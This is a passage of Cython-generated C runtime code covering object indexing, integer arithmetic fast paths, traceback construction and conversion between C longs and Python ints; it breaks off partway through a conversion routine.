    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* ObjectGetItem */
#if CYTHON_USE_TYPE_SLOTS
static PyObject *__Pyx_PyObject_GetIndex(PyObject *obj, PyObject *index) {
    PyObject *runerr = NULL;
    Py_ssize_t key_value;
    key_value = __Pyx_PyIndex_AsSsize_t(index);
    if (likely(key_value != -1 || !(runerr = PyErr_Occurred()))) {
        return __Pyx_GetItemInt_Fast(obj, key_value, 0, 1, 1);
    }
    if (PyErr_GivenExceptionMatches(runerr, PyExc_OverflowError)) {
        __Pyx_TypeName index_type_name = __Pyx_PyType_GetName(Py_TYPE(index));
        PyErr_Clear();
        PyErr_Format(PyExc_IndexError,
            "cannot fit '" __Pyx_FMT_TYPENAME "' into an index-sized integer", index_type_name);
        __Pyx_DECREF_TypeName(index_type_name);
    }
    return NULL;
}
static PyObject *__Pyx_PyObject_GetItem_Slow(PyObject *obj, PyObject *key) {
    __Pyx_TypeName obj_type_name;
    if (likely(PyType_Check(obj))) {
        PyObject *meth = __Pyx_PyObject_GetAttrStrNoError(obj, __pyx_n_s_class_getitem);
        if (!meth) {
            PyErr_Clear();
        } else {
            PyObject *result = __Pyx_PyObject_CallOneArg(meth, key);
            Py_DECREF(meth);
            return result;
        }
    }
    obj_type_name = __Pyx_PyType_GetName(Py_TYPE(obj));
    PyErr_Format(PyExc_TypeError,
        "'" __Pyx_FMT_TYPENAME "' object is not subscriptable", obj_type_name);
    __Pyx_DECREF_TypeName(obj_type_name);
    return NULL;
}
static PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject *key) {
    PyTypeObject *tp = Py_TYPE(obj);
    PyMappingMethods *mm = tp->tp_as_mapping;
    PySequenceMethods *sm = tp->tp_as_sequence;
    if (likely(mm && mm->mp_subscript)) {
        return mm->mp_subscript(obj, key);
    }
    if (likely(sm && sm->sq_item)) {
        return __Pyx_PyObject_GetIndex(obj, key);
    }
    return __Pyx_PyObject_GetItem_Slow(obj, key);
}
#endif

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_SubtractObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {
    CYTHON_MAYBE_UNUSED_VAR(intval);
    CYTHON_MAYBE_UNUSED_VAR(inplace);
    CYTHON_UNUSED_VAR(zerodivision_check);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
        
            x = (long)((unsigned long)a - (unsigned long)b);
            if (likely((x^a) >= 0 || (x^~b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_subtract(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        if (unlikely(__Pyx_PyLong_IsZero(op1))) {
            return PyLong_FromLong(-intval);
        }
        if (likely(__Pyx_PyLong_IsCompact(op1))) {
            a = __Pyx_PyLong_CompactValue(op1);
        } else {
            const digit* digits = __Pyx_PyLong_Digits(op1);
            const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(op1);
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
                    #ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
                    #endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_subtract(op1, op2);
            }
        }
                x = a - b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla - llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
#if CYTHON_COMPILING_IN_LIMITED_API
        double a = __pyx_PyFloat_AsDouble(op1);
#else
        double a = PyFloat_AS_DOUBLE(op1);
#endif
            double result;
            
            PyFPE_START_PROTECT("subtract", return NULL)
            result = ((double)a) - (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceSubtract : PyNumber_Subtract)(op1, op2);
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    CYTHON_MAYBE_UNUSED_VAR(tstate);
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStrNoError(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
#if !CYTHON_COMPILING_IN_LIMITED_API
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}
#endif

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6 && !CYTHON_COMPILING_IN_LIMITED_API
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
static PyObject *__Pyx_PyCode_Replace_For_AddTraceback(PyObject *code, PyObject *scratch_dict,
                                                       PyObject *firstlineno, PyObject *name) {
    PyObject *replace = NULL;
    if (unlikely(PyDict_SetItemString(scratch_dict, "co_firstlineno", firstlineno))) return NULL;
    if (unlikely(PyDict_SetItemString(scratch_dict, "co_name", name))) return NULL;
    replace = PyObject_GetAttrString(code, "replace");
    if (likely(replace)) {
        PyObject *result;
        result = PyObject_Call(replace, __pyx_empty_tuple, scratch_dict);
        Py_DECREF(replace);
        return result;
    }
    PyErr_Clear();
    #if __PYX_LIMITED_VERSION_HEX < 0x030780000
    {
        PyObject *compiled = NULL, *result = NULL;
        if (unlikely(PyDict_SetItemString(scratch_dict, "code", code))) return NULL;
        if (unlikely(PyDict_SetItemString(scratch_dict, "type", (PyObject*)(&PyType_Type)))) return NULL;
        compiled = Py_CompileString(
            "out = type(code)(\n"
            "  code.co_argcount, code.co_kwonlyargcount, code.co_nlocals, code.co_stacksize,\n"
            "  code.co_flags, code.co_code, code.co_consts, code.co_names,\n"
            "  code.co_varnames, code.co_filename, co_name, co_firstlineno,\n"
            "  code.co_lnotab)\n", "<dummy>", Py_file_input);
        if (!compiled) return NULL;
        result = PyEval_EvalCode(compiled, scratch_dict, scratch_dict);
        Py_DECREF(compiled);
        if (!result) PyErr_Print();
        Py_DECREF(result);
        result = PyDict_GetItemString(scratch_dict, "out");
        if (result) Py_INCREF(result);
        return result;
    }
    #else
    return NULL;
    #endif
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyObject *code_object = NULL, *py_py_line = NULL, *py_funcname = NULL, *dict = NULL;
    PyObject *replace = NULL, *getframe = NULL, *frame = NULL;
    PyObject *exc_type, *exc_value, *exc_traceback;
    int success = 0;
    if (c_line) {
        (void) __pyx_cfilenm;
        (void) __Pyx_CLineForTraceback(__Pyx_PyThreadState_Current, c_line);
    }
    PyErr_Fetch(&exc_type, &exc_value, &exc_traceback);
    code_object = Py_CompileString("_getframe()", filename, Py_eval_input);
    if (unlikely(!code_object)) goto bad;
    py_py_line = PyLong_FromLong(py_line);
    if (unlikely(!py_py_line)) goto bad;
    py_funcname = PyUnicode_FromString(funcname);
    if (unlikely(!py_funcname)) goto bad;
    dict = PyDict_New();
    if (unlikely(!dict)) goto bad;
    {
        PyObject *old_code_object = code_object;
        code_object = __Pyx_PyCode_Replace_For_AddTraceback(code_object, dict, py_py_line, py_funcname);
        Py_DECREF(old_code_object);
    }
    if (unlikely(!code_object)) goto bad;
    getframe = PySys_GetObject("_getframe");
    if (unlikely(!getframe)) goto bad;
    if (unlikely(PyDict_SetItemString(dict, "_getframe", getframe))) goto bad;
    frame = PyEval_EvalCode(code_object, dict, dict);
    if (unlikely(!frame) || frame == Py_None) goto bad;
    success = 1;
  bad:
    PyErr_Restore(exc_type, exc_value, exc_traceback);
    Py_XDECREF(code_object);
    Py_XDECREF(py_py_line);
    Py_XDECREF(py_funcname);
    Py_XDECREF(dict);
    Py_XDECREF(replace);
    if (success) {
        PyTraceBack_Here(
            (struct _frame*)frame);
    }
    Py_XDECREF(frame);
}
#else
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}
#endif

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
#if !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030d0000
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
#else
        PyObject *from_bytes, *result = NULL;
        PyObject *py_bytes = NULL, *arg_tuple = NULL, *kwds = NULL, *order_str = NULL;
        from_bytes = PyObject_GetAttrString((PyObject*)&PyLong_Type, "from_bytes");
        if (!from_bytes) return NULL;
        py_bytes = PyBytes_FromStringAndSize((char*)bytes, sizeof(long));
        if (!py_bytes) goto limited_bad;
        order_str = PyUnicode_FromString(little ? "little" : "big");
        if (!order_str) goto limited_bad;
        arg_tuple = PyTuple_Pack(2, py_bytes, order_str);
        if (!arg_tuple) goto limited_bad;
        if (!is_unsigned) {
            kwds = PyDict_New();
            if (!kwds) goto limited_bad;
            if (PyDict_SetItemString(kwds, "signed", __Pyx_NewRef(Py_True))) goto limited_bad;
        }
        result = PyObject_Call(from_bytes, arg_tuple, kwds);
        limited_bad:
        Py_XDECREF(kwds);
        Py_XDECREF(arg_tuple);
        Py_XDECREF(order_str);
        Py_XDECREF(py_bytes);
        Py_XDECREF(from_bytes);
        return result;
#endif
    }
}

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if ((sizeof(long) < sizeof(long))) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            if (unlikely(__Pyx_PyLong_IsNeg(x))) {
                goto raise_neg_overflow;
            } else if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_DigitCount(x)) {
                    case 2:
                        if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) >= 2 * PyLong_SHIFT)) {
                                return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) >= 3 * PyLong_SHIFT)) {
                                return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) >= 4 * PyLong_SHIFT)) {
                                return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                            }
                        }
                        break;
                }
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if ((sizeof(long) <= sizeof(unsigned long))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(long) <= sizeof(unsigned PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_SignedDigitCount(x)) {
                    case -2:
                        if ((8 * sizeof(long) - 1 > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                                return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case 2:
                        if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                                return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case -3:
                        if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                                return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                                return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case -4:
                        if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {
                                return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
